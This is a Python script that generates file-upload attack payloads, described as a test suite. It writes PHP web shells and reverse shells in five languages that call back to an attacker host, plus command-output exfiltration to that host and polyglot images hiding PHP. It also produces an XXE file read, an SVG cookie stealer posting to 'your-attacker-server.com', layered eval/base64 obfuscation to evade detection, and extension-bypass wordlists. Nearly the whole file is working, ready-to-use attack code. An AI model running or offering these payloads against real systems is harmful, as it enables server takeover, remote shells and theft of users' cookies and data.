#!/usr/bin/env python3
import os
import argparse
import random
import string
import base64
import re
import gzip
import zlib

def generate_random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def create_directory(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

class CodeObfuscator:
    def obfuscate(self, code: str) -> str:
        raise NotImplementedError

    def _encode_string(self, string: str) -> str:
        b64 = base64.b64encode(string.encode()).decode()
        hex_str = ''.join([hex(ord(c))[2:].zfill(2) for c in string])
        oct_str = ''.join([oct(ord(c))[2:].zfill(3) for c in string])
        return b64, hex_str, oct_str

class PhpObfuscator(CodeObfuscator):
    def obfuscate(self, code: str) -> str:
        code = re.sub(r'//.*?\n|/\*.*?\*/', '', code, flags=re.DOTALL)
        def encode_string(match):
            string = match.group(1)
            b64, hex_str, oct_str = self._encode_string(string)
            techniques = [
                f'base64_decode("{b64}")',
                f'pack("H*", "{hex_str}")',
                f'chr(octdec("{oct_str[0:3]}")) . chr(octdec("{oct_str[3:6]}"))',
                f'str_rot13(base64_decode("{b64}"))',
                f'strrev(base64_decode("{b64}"))'
            ]
            return random.choice(techniques)
        code = re.sub(r'"([^"\\]*(?:\\.[^"\\]*)*)"', encode_string, code)
        var_pattern = r'\$([a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*)'
        variables = set(re.findall(var_pattern, code))
        var_map = {var: f'${generate_random_string(8)}' for var in variables}
        for old_var, new_var in var_map.items():
            code = code.replace(f'${old_var}', new_var)
        func_pattern = r'function\s+([a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*)'
        functions = set(re.findall(func_pattern, code))
        func_map = {func: generate_random_string(8) for func in functions}
        for old_func, new_func in func_map.items():
            code = code.replace(f'function {old_func}', f'function {new_func}')
            code = code.replace(f'{old_func}(', f'{new_func}(')
        layers = [
            lambda x: f'<?php eval(base64_decode("{base64.b64encode(x.encode()).decode()}")); ?>',
            lambda x: f'<?php eval(gzinflate(base64_decode("{base64.b64encode(gzip.compress(x.encode())).decode()}"))); ?>',
            lambda x: f'<?php eval(str_rot13(base64_decode("{base64.b64encode(x.encode()).decode()}"))); ?>',
            lambda x: f'<?php $k="{generate_random_string(8)}";eval(base64_decode(strtr("{base64.b64encode(x.encode()).decode()}",$k,strrev($k)))); ?>',
            lambda x: f'<?php $a=base64_decode("{base64.b64encode(x.encode()).decode()}");$b=str_rot13($a);eval($b); ?>',
            lambda x: f'<?php $a="base64_decode";$b=$a("{base64.b64encode(x.encode()).decode()}");$c="gzinflate";$d=$c($b);$e=create_function("",$d);$e(); ?>',
            lambda x: '<?php array_map("assert", array("{}")); ?>'.format(x.replace('"', '\\"'))
        ]
        for layer in random.sample(layers, random.randint(2, 4)):
            code = layer(code)
        return code

class JavaObfuscator(CodeObfuscator):
    def obfuscate(self, code: str) -> str:
        code = re.sub(r'//.*?\n|/\*.*?\*/', '', code, flags=re.DOTALL)
        def encode_string(match):
            string = match.group(1)
            b64, hex_str, oct_str = self._encode_string(string)
            techniques = [
                f'new String(Base64.getDecoder().decode("{b64}"))',
                f'new String(new byte[]{{(byte)0x42}})',
                f'new String(new byte[]{{(byte)0o42}})',
                f'new String(new byte[]{{(byte)42}})'
            ]
            return random.choice(techniques)
        code = re.sub(r'"([^"\\]*(?:\\.[^"\\]*)*)"', encode_string, code)
        class_pattern = r'class\s+([a-zA-Z_][a-zA-Z0-9_]*)'
        classes = set(re.findall(class_pattern, code))
        class_map = {cls: generate_random_string(8) for cls in classes}
        for old_class, new_class in class_map.items():
            code = code.replace(f'class {old_class}', f'class {new_class}')
            code = code.replace(f'new {old_class}', f'new {new_class}')
        method_pattern = r'(public|private|protected)?\s+[a-zA-Z_][a-zA-Z0-9_]*\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\('
        methods = set(re.findall(method_pattern, code))
        method_map = {method[1]: generate_random_string(8) for method in methods}
        for old_method, new_method in method_map.items():
            code = code.replace(f' {old_method}(', f' {new_method}(')
        code = self._obfuscate_control_flow(code)
        return code
    
    def _obfuscate_control_flow(self, code: str) -> str:
        control_flow = """
        int _ = 0;
        while(_ < 1) {
            if(_ == 0) {
                _++;
                continue;
            }
            break;
        }
        """
        return code.replace('{', '{' + control_flow)

class PythonObfuscator(CodeObfuscator):
    def obfuscate(self, code: str) -> str:
        code = re.sub(r'#.*?\n', '', code)
        def encode_string(match):
            string = match.group(1)
            b64, hex_str, oct_str = self._encode_string(string)
            oct_chunks = [oct_str[idx:idx+3] for idx in range(0, len(oct_str), 3)]
            oct_joined = '", "'.join(oct_chunks)
            techniques = [
                f'base64.b64decode("{b64}").decode()',
                f'bytes.fromhex("{hex_str}").decode()',
                f'"".join(chr(int(x, 8)) for x in ["{oct_joined}"])',
                f'"".join(chr(ord(c) ^ 0x42) for c in "{string}")',
                f'"".join(chr((ord(c) + 13) % 256) for c in "{string}")'
            ]
            return random.choice(techniques)
        code = re.sub(r'"([^"\\]*(?:\\.[^"\\]*)*)"', encode_string, code)
        var_pattern = r'([a-zA-Z_][a-zA-Z0-9_]*)'
        variables = set(re.findall(var_pattern, code))
        var_map = {var: generate_random_string(8) for var in variables if var not in ['True', 'False', 'None', 'self']}
        for old_var, new_var in var_map.items():
            code = code.replace(f' {old_var} ', f' {new_var} ')
            code = code.replace(f' {old_var}\n', f' {new_var}\n')
            code = code.replace(f' {old_var},', f' {new_var},')
        code = self._obfuscate_control_flow(code)
        return code
    
    def _obfuscate_control_flow(self, code: str) -> str:
        control_flow = """
        _ = 0
        while _ < 1:
            if _ == 0:
                _ += 1
                continue
            break
        """
        return code.replace('\n', '\n' + control_flow)

class RubyObfuscator(CodeObfuscator):
    def obfuscate(self, code: str) -> str:
        code = re.sub(r'#.*?\n', '', code)
        def encode_string(match):
            string = match.group(1)
            b64, hex_str, oct_str = self._encode_string(string)
            techniques = [
                f'Base64.decode64("{b64}").force_encoding("UTF-8")',
                f'["{hex_str}"].pack("H*")',
                f'"{oct_str}".scan(/.{3}/).map {{|x| x.to_i(8).chr}}.join',
                f'"{string}".bytes.map {{|x| (x ^ 0x42).chr}}.join',
                f'"{string}".tr("A-Za-z", "N-ZA-Mn-za-m")'
            ]
            return random.choice(techniques)
        code = re.sub(r'"([^"\\]*(?:\\.[^"\\]*)*)"', encode_string, code)
        var_pattern = r'([a-zA-Z_][a-zA-Z0-9_]*)'
        variables = set(re.findall(var_pattern, code))
        var_map = {var: generate_random_string(8) for var in variables if var not in ['true', 'false', 'nil', 'self']}
        for old_var, new_var in var_map.items():
            code = code.replace(f' {old_var} ', f' {new_var} ')
            code = code.replace(f' {old_var}\n', f' {new_var}\n')
            code = code.replace(f' {old_var},', f' {new_var},')
        code = self._obfuscate_control_flow(code)
        return code
    
    def _obfuscate_control_flow(self, code: str) -> str:
        control_flow = """
        _ = 0
        while _ < 1
            if _ == 0
                _ += 1
                next
            end
            break
        end
        """
        return code.replace('\n', '\n' + control_flow)

class NodejsObfuscator(CodeObfuscator):
    def obfuscate(self, code: str) -> str:
        code = re.sub(r'//.*?\n|/\*.*?\*/', '', code, flags=re.DOTALL)
        def encode_string(match):
            string = match.group(1)
            b64, hex_str, oct_str = self._encode_string(string)
            techniques = [
                f'Buffer.from("{b64}", "base64").toString()',
                f'Buffer.from("{hex_str}", "hex").toString()',
                f'String.fromCharCode(..."{oct_str}".match(/.{1,3}/g).map(x => parseInt(x, 8)))',
                f'"{string}".split("").map(c => String.fromCharCode(c.charCodeAt(0) ^ 0x42)).join("")',
                f'"{string}".split("").map(c => String.fromCharCode((c.charCodeAt(0) + 13) % 256)).join("")'
            ]
            return random.choice(techniques)
        code = re.sub(r'"([^"\\]*(?:\\.[^"\\]*)*)"', encode_string, code)
        var_pattern = r'([a-zA-Z_][a-zA-Z0-9_]*)'
        variables = set(re.findall(var_pattern, code))
        var_map = {var: generate_random_string(8) for var in variables if var not in ['true', 'false', 'null', 'undefined', 'this']}
        for old_var, new_var in var_map.items():
            code = code.replace(f' {old_var} ', f' {new_var} ')
            code = code.replace(f' {old_var}\n', f' {new_var}\n')
            code = code.replace(f' {old_var},', f' {new_var},')
        code = self._obfuscate_control_flow(code)
        return code
    
    def _obfuscate_control_flow(self, code: str) -> str:
        control_flow = """
        let _ = 0;
        while (_ < 1) {
            if (_ === 0) {
                _++;
                continue;
            }
            break;
        }
        """
        return code.replace('{', '{' + control_flow)

def get_obfuscator(language: str) -> CodeObfuscator:
    obfuscators = {
        "php": PhpObfuscator(),
        "java": JavaObfuscator(),
        "python": PythonObfuscator(),
        "ruby": RubyObfuscator(),
        "nodejs": NodejsObfuscator()
    }
    return obfuscators.get(language)

def get_payload_content(language, payload_type, lhost=None, lport=None):
    payloads = {
        "php": {
            "poc": '<?php echo "File upload vulnerability detected!"; ?>',
            "exploit": "<?php system($_GET['cmd']); ?>",
            "rev_shell": f"<?php $ip = '{lhost}'; $port = {lport}; $sock = fsockopen($ip, $port); $proc = proc_open('/bin/sh -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes); ?>",
            "rev_shell_alt1": f"<?php $ip = '{lhost}'; $port = {lport}; $sock = stream_socket_client(\"tcp://{{$ip}}:{{$port}}\"); $proc = proc_open('/bin/sh -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes); ?>",
            "rev_shell_alt2": f"<?php $ip = '{lhost}'; $port = {lport}; $s = socket_create(AF_INET, SOCK_STREAM, SOL_TCP); socket_connect($s, $ip, $port); $proc = proc_open('/bin/sh -i', array(0 => $s, 1 => $s, 2 => $s), $pipes); ?>",
            "non_interactive_shell": f"<?php system('curl http://{lhost}:{lport}/?c=' . urlencode(shell_exec($_GET['cmd']))); ?>"
        },
        "java": {
            "poc": 'public class Poc { public static void main(String[] args) { System.out.println("File upload vulnerability detected!"); } }',
            "exploit": 'import java.io.*; public class Exploit { public static void main(String[] args) throws IOException { String[] cmd = System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c", args[0]} : new String[]{"/bin/sh", "-c", args[0]}; new ProcessBuilder(cmd).start(); } }',
            "rev_shell": f'import java.io.*; import java.net.*; public class RevShell {{ public static void main(String[] args) throws Exception {{ String host="{lhost}"; int port={lport}; String cmd="/bin/sh"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start(); Socket s=new Socket(host,port); InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream(); OutputStream po=p.getOutputStream(),so=s.getOutputStream(); while(!s.isClosed()){{ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush(); po.flush(); Thread.sleep(50); try{{p.exitValue();break;}}catch(Exception e){{}} }}; p.destroy(); s.close(); }} }}',
            "non_interactive_shell": f'import java.io.*; import java.net.*; public class NonInteractiveShell {{ public static void main(String[] args) throws Exception {{ String host="{lhost}"; int port={lport}; String cmd=args[0]; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start(); BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; URL url=new URL("http://"+host+":"+port); HttpURLConnection c=(HttpURLConnection)url.openConnection(); c.setRequestMethod("POST"); c.setDoOutput(true); try(OutputStream o=c.getOutputStream()){{ while((l=r.readLine())!=null){{ o.write(l.getBytes()); }} }} c.getResponseMessage(); }} }}'
        },
        "python": {
            "poc": 'print("File upload vulnerability detected!")',
            "exploit": 'import os; os.system(input("Command: "))',
            "rev_shell": f'import socket,os,pty; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("{lhost}",{lport})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); pty.spawn("/bin/sh")',
            "non_interactive_shell": f'import os,sys,urllib.request, urllib.parse; cmd = sys.argv[1]; handle = os.popen(cmd); data = handle.read(); handle.close(); urllib.request.urlopen("http://{lhost}:{lport}/?c=" + urllib.parse.quote(data))'
        },
        "ruby": {
            "poc": 'puts "File upload vulnerability detected!"',
            "exploit": 'system(gets.chomp)',
            "rev_shell": f'require \'socket\';require \'open3\';c=TCPSocket.new("{lhost}",{lport});while(cmd=c.gets);Open3.popen3(cmd) do |i,o,e,t|;c.puts o.read;c.puts e.read;end;end',
            "non_interactive_shell": f'require \'socket\';require \'uri\';require \'net/http\';cmd = ARGV[0]; res = `{{cmd}}`; uri = URI("http://{lhost}:{lport}/"); Net::HTTP.post_form(uri, \'c\' => res)'
        },
        "nodejs": {
            "poc": 'console.log("File upload vulnerability detected!");',
            "exploit": "const { exec } = require('child_process'); exec(process.argv[2]);",
            "rev_shell": f"const net = require('net'); const {{ exec }} = require('child_process'); const client = new net.Socket(); client.connect({lport}, '{lhost}', () => {{ const sh = exec('/bin/sh'); client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }});",
            "non_interactive_shell": f"const {{ exec }} = require('child_process'); const http = require('http'); const cmd = process.argv[2]; exec(cmd, (err, stdout, stderr) => {{ const data = stdout || stderr; const options = {{ host: '{lhost}', port: {lport}, path: '/', method: 'POST' }}; const req = http.request(options); req.write(data); req.end(); }});"
        }
    }
    return payloads.get(language, {}).get(payload_type)

def generate_file(directory, filename, language, payload_type, obfuscate=False, lhost=None, lport=None):
    content = get_payload_content(language, payload_type, lhost, lport)
    if not content:
        return

    if obfuscate:
        obfuscator = get_obfuscator(language)
        if obfuscator:
            content = obfuscator.obfuscate(content)
    
    with open(os.path.join(directory, filename), "w") as f:
        f.write(content)

def get_magic_bytes(extension):
    magic_bytes = {
        'jpg': bytes([0xFF, 0xD8, 0xFF, 0xE0]),
        'jpeg': bytes([0xFF, 0xD8, 0xFF, 0xE0]),
        'png': bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]),
        'gif': bytes([0x47, 0x49, 0x46, 0x38]),
        'bmp': bytes([0x42, 0x4D]),
        'tiff': bytes([0x49, 0x49, 0x2A, 0x00]),
        'webp': bytes([0x52, 0x49, 0x46, 0x46]),
        'ico': bytes([0x00, 0x00, 0x01, 0x00]),
        'pdf': bytes([0x25, 0x50, 0x44, 0x46]),
        'svg': bytes([0x3C, 0x3F, 0x78, 0x6D, 0x6C])
    }
    return magic_bytes.get(extension.lower(), b'')

def generate_polyglot_png(directory, language, is_exploit=False, obfuscate=False, lhost=None, lport=None):
    if language != "php":
        return

    payload_type = "exploit" if is_exploit else "poc"
    content = get_payload_content(language, payload_type, lhost, lport)

    if obfuscate:
        obfuscator = get_obfuscator(language)
        if obfuscator:
            content = obfuscator.obfuscate(content)
    
    php_payload = content.encode()

    png_header = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89'
    comment_chunk_name = b'payload\x00'
    compressed_payload = gzip.compress(php_payload)
    chunk_data = comment_chunk_name + b'\x00' + compressed_payload
    chunk_len = len(chunk_data).to_bytes(4, 'big')
    chunk_crc = (zlib.crc32(b'zTXt' + chunk_data)).to_bytes(4, 'big')
    comment_chunk = chunk_len + b'zTXt' + chunk_data + chunk_crc
    png_end = b'\x00\x00\x00\x0cIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01\r\n-\xb4'
    png_iend = b'\x00\x00\x00\x00IEND\xaeB`\x82'
    final_payload = png_header + comment_chunk + png_end + png_iend

    filename = f"polyglot_struct.{payload_type}.{language}.png"
    with open(os.path.join(directory, filename), "wb") as f:
        f.write(final_payload)

def generate_polyglot_files(directory, language, extension, is_exploit=False, obfuscate=False, lhost=None, lport=None):
    if extension == 'png' and language == 'php':
        generate_polyglot_png(directory, language, is_exploit, obfuscate, lhost, lport)
        return

    payload_type = "exploit" if is_exploit else "poc"
    content = get_payload_content(language, payload_type, lhost, lport)
    if not content:
        return

    if obfuscate:
        obfuscator = get_obfuscator(language)
        if obfuscator:
            content = obfuscator.obfuscate(content)

    filename = f"polyglot.{payload_type}.{language}.{extension}"
    with open(os.path.join(directory, filename), "wb") as f:
        magic_bytes = get_magic_bytes(extension)
        if magic_bytes:
            f.write(magic_bytes)
        f.write(content.encode())

def generate_xee_files(directory, language, extension, obfuscate=False):
    xee_content = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/hosts" >]><foo>&xxe;</foo>'
    if obfuscate:
        obfuscator = get_obfuscator(language)
        if obfuscator:
            xee_content = obfuscator.obfuscate(xee_content)
    filename = f"xee.{language}.{extension}"
    with open(os.path.join(directory, filename), "w") as f:
        f.write(xee_content)

def generate_svg_xss_files(directory, extension="svg"):
    xss_payload = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(\'XSS\')"><text x="20" y="20" font-size="20">XSS Test</text></svg>'
    cookie_stealer_payload = '<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(\'https://your-attacker-server.com/?c=\' + btoa(document.cookie))" />'
    with open(os.path.join(directory, f"xss_simple.{extension}"), "w") as f:
        f.write(xss_payload)
    with open(os.path.join(directory, f"xss_cookie_stealer.{extension}"), "w") as f:
        f.write(cookie_stealer_payload)

def generate_bypass_wordlist(directory, language):
    bypass_chars = ['%20','%0a','%0d','%0d%0a','%00','/','.\\','.','…',':',';','%09','%2e','%252e']
    extensions = {
        "php": ['.php', '.phps', '.phar', '.phtml', '.php3', '.php4', '.php5', '.inc'],
        "java": ['.java', '.class', '.jar', '.war'],
        "python": ['.py', '.pyc', '.pyo', '.pyd'],
        "ruby": ['.rb', '.rbw'],
        "nodejs": ['.js', '.mjs', '.cjs']
    }
    wordlist_file = os.path.join(directory, f"bypass_wordlist_{language}.txt")
    with open(wordlist_file, "w") as f:
        for ext in extensions.get(language, []):
            f.write(f"{ext}\n")
            f.write(f"{ext.upper()}\n")
            f.write(f"{ext.lower()}\n")
            for char in bypass_chars:
                f.write(f"{char}{ext}\n")
                f.write(f"{ext}{char}\n")
                f.write(f"{char}{ext.upper()}\n")
                f.write(f"{ext.upper()}{char}\n")
                f.write(f"{char}{ext.lower()}\n")
                f.write(f"{ext.lower()}{char}\n")
                f.write(f"{char}{ext}%00\n")
                f.write(f"%00{char}{ext}\n")
                f.write(f"{ext}%00{char}\n")
                f.write(f"{char}%00{ext}\n")
                for char2 in bypass_chars:
                    if char != char2:
                        f.write(f"{char}{char2}{ext}\n")
                        f.write(f"{ext}{char}{char2}\n")
                        f.write(f"{char}{ext}{char2}\n")
                        f.write(f"{char}{char2}{ext}%00\n")
                        f.write(f"%00{char}{char2}{ext}\n")
                        f.write(f"{char}{ext}%00{char2}\n")
                        f.write(f"{char}{char2}{ext.upper()}\n")
                        f.write(f"{ext.upper()}{char}{char2}\n")
                        f.write(f"{char}{ext.upper()}{char2}\n")

def generate_content_type_wordlist(directory, language):
    mime_types = ['image/aces','image/avci','image/avcs','image/bmp','image/cgm','image/dicom-rle','image/emf','image/example','image/fits','image/g3fax','image/gif','image/heic','image/heic-sequence','image/heif','image/heif-sequence','image/hej2k','image/hsj2','image/ief','image/jls','image/jp2','image/jpeg','image/jpg','image/jph','image/jphc','image/jpm','image/jpx','image/jxr','image/jxra','image/jxrs','image/jxs','image/jxsc','image/jxsi','image/jxss','image/ktx','image/ktx2','image/naplps','image/pjpeg','image/png','image/prs.btif','image/prs.pti','image/pwg-raster','image/svg+xml','image/t38','image/tiff','image/tiff-fx','image/vnd.adobe.photoshop','image/vnd.airzip.accelerator.azv','image/vnd.cns.inf2','image/vnd.dece.graphic','image.djvu','image/vnd.dvb.subtitle','image/vnd.dwg','image/vnd.dxf','image/vnd.fastbidsheet','image/vnd.fpx','image/vnd.fst','image/vnd.fujixerox.edmics-mmr','image/vnd.fujixerox.edmics-rlc','image/vnd.globalgraphics.pgb','image/vnd.microsoft.icon','image/vnd.mix','image/vnd.mozilla.apng','image/vnd.ms-modi','image/vnd.net-fpx','image/vnd.pco.b16','image/vnd.radiance','image/vnd.sealed.png','image/vnd.sealedmedia.softseal.gif','image/vnd.sealedmedia.softseal.jpg','image/vnd.svf','image/vnd.tencent.tap','image/vnd.valve.source.texture','image/vnd.wap.wbmp','image/vnd.xiff','image/vnd.zbrush.pcx','image/webp','image/wmf','image/x-citrix-jpeg','image/x-citrix-png','image/x-cmu-raster','image/x-cmx','image/x-freehand','image/x-icon','image/x-pcx','image/x-pict','image/x-png','image/x-portable-anymap','image/x-portable-bitmap','image/x-portable-graymap','image/x-portable-pixmap','image/x-rgb','image/x-xbitmap','image/x-xpixmap','image/x-xwindowdump']
    wordlist_file = os.path.join(directory, f"content_type_wordlist_{language}.txt")
    with open(wordlist_file, "w") as f:
        for mime in mime_types:
            f.write(f"{mime}\n")

def main():
    parser = argparse.ArgumentParser(
        description='Generates a complete suite of test files for file upload vulnerabilities.',
        formatter_class=argparse.RawTextHelpFormatter
    )
    
    poc_group = parser.add_argument_group('PoC (Proof of Concept)')
    poc_group.add_argument('-poc', action='store_true', help='Generate non-intrusive Proof-of-Concept files.')

    exploit_group = parser.add_argument_group('Exploits')
    exploit_group.add_argument('-exploit', action='store_true', help='Generate command injection exploit files (e.g., ?cmd=whoami).')
    exploit_group.add_argument('--rev-shell', action='store_true', help='Generate interactive and non-interactive reverse shell payloads.')
    exploit_group.add_argument('--lhost', type=str, help='(Required with --rev-shell) LHOST for the reverse shell.')
    exploit_group.add_argument('--lport', type=int, help='(Required with --rev-shell) LPORT for the reverse shell.')

    modifier_group = parser.add_argument_group('Modifiers and Bypass Techniques')
    modifier_group.add_argument('-obfuscate', action='store_true', help='Obfuscate the generated payload code.')
    
    args = parser.parse_args()

    if args.rev_shell and (not args.lhost or not args.lport):
        parser.error("--rev-shell requires the --lhost and --lport arguments.")

    base_directory = "file_upload_suite"
    create_directory(base_directory)

    languages = ["php", "java", "python", "ruby", "nodejs"]
    extensions = ["png", "jpg", "jpeg", "svg", "pdf", "gif", "bmp", "tiff", "webp", "ico"]

    for language in languages:
        language_directory = os.path.join(base_directory, language)
        create_directory(language_directory)

        for extension in extensions:
            target_filename_base = f"shell.{language}"

            if args.poc:
                filename = f"poc_{target_filename_base}.{extension}"
                generate_file(language_directory, filename, language, "poc", args.obfuscate)
                generate_polyglot_files(language_directory, language, extension, is_exploit=False, obfuscate=args.obfuscate)
            
            if args.exploit:
                filename = f"exploit_{target_filename_base}.{extension}"
                generate_file(language_directory, filename, language, "exploit", args.obfuscate)
                generate_polyglot_files(language_directory, language, extension, is_exploit=True, obfuscate=args.obfuscate)

            if args.rev_shell:
                filename = f"revshell_{target_filename_base}.{extension}"
                generate_file(language_directory, filename, language, "rev_shell", args.obfuscate, args.lhost, args.lport)
                
                filename_ni = f"revshell_non_interactive_{target_filename_base}.{extension}"
                generate_file(language_directory, filename_ni, language, "non_interactive_shell", args.obfuscate, args.lhost, args.lport)
                
                if language == "php":
                    filename_alt1 = f"revshell_alt1_{target_filename_base}.{extension}"
                    generate_file(language_directory, filename_alt1, language, "rev_shell_alt1", args.obfuscate, args.lhost, args.lport)
                    filename_alt2 = f"revshell_alt2_{target_filename_base}.{extension}"
                    generate_file(language_directory, filename_alt2, language, "rev_shell_alt2", args.obfuscate, args.lhost, args.lport)

            generate_xee_files(language_directory, language, extension, args.obfuscate)
            
            if extension == "svg":
                generate_svg_xss_files(language_directory)

        generate_bypass_wordlist(language_directory, language)
        generate_content_type_wordlist(language_directory, language)

    print(f"\nFile upload test suite generated in: {base_directory}")

if __name__ == "__main__":
    main()